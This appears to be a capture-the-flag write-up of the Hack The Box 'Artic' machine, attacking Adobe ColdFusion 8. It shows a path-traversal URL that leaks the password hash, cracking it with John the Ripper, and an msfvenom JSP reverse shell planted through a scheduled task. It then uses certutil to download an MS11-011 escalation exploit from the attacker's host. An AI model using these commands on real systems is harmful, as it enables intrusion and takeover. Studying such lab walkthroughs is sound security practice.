# Artic

## Initial Nmap Scan

Initial `nmap` scan reveals the following:

```bash
nmap  -A -T4 -p-  -Pn 10.10.10.11  

PORT          STATE  SERVICE VERSION
53/tcp    closed domain
135/tcp   open   msrpc   Microsoft Windows RPC
8500/tcp  open   fmtp?
49154/tcp open   msrpc   Microsoft Windows RPC

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The only port that stands out is 8500 running fmtp. I was not able to find any notable information regarding that port on Google. However, if we run `curl` against the port we do receive a directory result.

Browse to Http://10.10.10.11:8500 in the browser:

![](<../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

{% hint style="info" %}
This box is exceptionally slow and I did initially try running a directory brute force before giving up as this was only hitting a few directory attempts a minute.
{% endhint %}

After doing a Google search the directory "CFIDE" is related to Adobe Cold Fusion. If we head over to the administration login page at:

{% embed url="http://10.10.10.11:8500/CFIDE/administrator/index.cfm" %}

We can see that the version of Cold Fusion is 8. With this information lets run `Searchsploit` and see what we get:

![](<../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Looks like we have an interesting `Metasploit` module. Lets now move onto the exploitation stage and see what happens...

I did try to run this module in `Metasploit` however, i was receiving "File upload error..."

![](<../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png>)

The options to set this exploit are not very complicated with the only real variable being where to set the FCKEDITOR directory. I double checked my paths and concluded they was correct. I did not want to spend too long on something like this early on so went back to researching further on Google.

I soon came across a great link detailing a local file disclosure vulnerability in various Cold Fusion versions. [https://nets.ec/Coldfusion\_hacking](https://nets.ec/Coldfusion\_hacking)

To perform this exploit we will need to head over to Http://10.10.10.11/CFIDE/administrator/enter.cfm. Wait (patiently) for the page to load correctly. Once loaded paste the following link into the address bar:

[http://10.10.10.11/CFIDE/administrator/enter.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\ColdFusion8\lib\password.properties%00en](http://10.10.10.11/CFIDE/administrator/enter.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\ColdFusion8\lib\password.properties%00en)

This will disclose the hash of the administrator account as per below:

\[ Add image ]

We can take the disclosed hash \*\*2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 \*\*and run it through John the Ripper. I used the rockyou.txt wordlist and was able to extract the following information.

```bash
sudo john --wordlist=/home/kali/Desktop/rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
happyday         (?)

Session completed
```

We can head back to the Cold Fusion administrative login page and login with the credentials `Admin:happyday`

As we know Cold Fusion can serve Java files we need to generate a JSP payload. I used command below to generate the required payload.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f raw > shell.jsp
```

We will now need to start up a `Python SimpleHTTPServer` on our attacking machine so we can upload the reverse shell payload to the Cold Fusion server.

```bash
sudo Python -m SimpleHTPPServer 80
```

{% hint style="info" %}
sudo is required when trying to use ports in the range of 1-1024
{% endhint %}

Head over to the Mappings section on Cold Fusion and copy the directory path for CFIDE. We need to define where we will upload our shell.

[http://10.10.10.11:8500/CFIDE/administrator/settings/mappings.cfm](http://10.10.10.11:8500/CFIDE/administrator/settings/mappings.cfm)

![](<../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png>)

On the left side panel on Cold Fusion head over to "Debugging & Logging > Scheduled Tasks" We are going to create a scheduled task to download the reverse shell from our attacking machine.

![](<../../../.gitbook/assets/image (7) (1) (1) (1).png>)

Give the task any name you like and set the "One-Time" occurrence to any time you like as we will be kicking this task of manually in the near future. set the URL to the IP of your VPN interface and define the name of the payload you created earlier with `msfvenom`.

Set the public checkbox and paste the drive mapping from earlier appending the end with the name of our reverse shell. Submit the task and then head back over to "Scheduled Tasks" and manually run the task.

Wait a short while and you should see in your Python server terminal activity of the server receiving a GET request for the payload. After this has been completed we can head over to the server directory again at: [http://10.10.10.11:8500/CFIDE/](http://10.10.10.11:8500/CFIDE/)

You should now see the payload we upload in this directory. Set up `netcat` to listen in on the port define the LPORT=\<port> setting you used in `msfvenom` earlier.

![](<../../../.gitbook/assets/image (8) (1) (1) (1).png>)

![](<../../../.gitbook/assets/image (9) (1) (1) (1).png>)

Run the payload in the directory after setting up the listener. You should now receive shell on the server.

![](<../../../.gitbook/assets/image (10) (1) (1) (1).png>)

As always the next best step is to grab the system information and run it through Windows exploit suggester. Grab system information with the `systeminfo` command:

![](<../../../.gitbook/assets/image (11) (1) (1) (1).png>)

Copy this into a text file somewhere on the attacking machine. Run an update on the Windows-Exploit-Suggester.py using the \_--update \_switch.

![](<../../../.gitbook/assets/image (12) (1) (1) (1).png>)

We can now run this against our system information text file:

![](<../../../.gitbook/assets/image (13) (1) (1) (1).png>)

The exploit we are interested in is the MS11-011 exploit which can lead to a privilege escalation. The following link below will take you to a pre-compiled exploit for MS11-011.

[https://github.com/Re4son/Chimichurri/blob/master/Chimichurri.exe](https://github.com/Re4son/Chimichurri/blob/master/Chimichurri.exe)

After downloading the file store it in a directory and run the `Python SimpleHTTPServer` as mentioned earlier. It is recommended to rename the exploit before uploading to the victim machine. After the Python HTTP server is running we can use `certutil.exe` which is built into Windows by default to download the exploit from our attacking machine onto the Windows Server.

```bash
certutil.exe -urlcache -split -f "http://0.0.0.0/exploit.exe" exploit.exe
```

![](<../../../.gitbook/assets/image (14) (1).png>)

Before executing the executable we need to set up another listener on our attacking machine:

```bash
nc -lvp 4500
```

Now on the Windows machine we can call the exploit. Using our attacking machine IP and the port number specified above as parameters.

```bash
winner.exe 10.10.14.39 4500 
```

![](<../../../.gitbook/assets/image (15) (1) (1) (1).png>)
